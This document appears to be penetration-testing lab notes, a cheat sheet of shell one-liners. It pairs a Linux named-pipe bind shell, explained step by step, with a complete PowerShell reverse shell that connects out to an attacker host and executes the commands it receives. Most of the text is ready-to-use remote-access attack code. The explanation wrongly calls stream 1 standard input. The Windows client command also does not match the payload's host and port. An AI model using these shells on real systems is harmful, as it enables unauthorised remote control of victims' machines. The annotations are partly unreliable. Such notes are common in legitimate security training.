## Linux Shells  
**Bind Shell**

On client:  
`nc -nv 10.129.41.200 7777`

On victim machine:  
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`

#### Explanation of the above: 
Parts will be segmented by code before semicolon.  

Part 1: Removes /tmp/f  Semi colon executes command sequentially   
Part 2: Makes a FIFO named pipe at the location. /tmp/f is the fifo named pipe file  
Part 3: Concatenates the FIFO named pipe  
Part 4: Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).
Part 5: Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard input data stream (1) are redirected to the command following the pipe (|).
Part 6: Starts a nc listener and output is redirected to /tmp/f, serving the bash shell to whoever connects to the network socket.  


## Windows Shells
**Reverse Shells**

On client:  
`nc -nv 10.129.41.200 7777`

On victim machine:  
`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
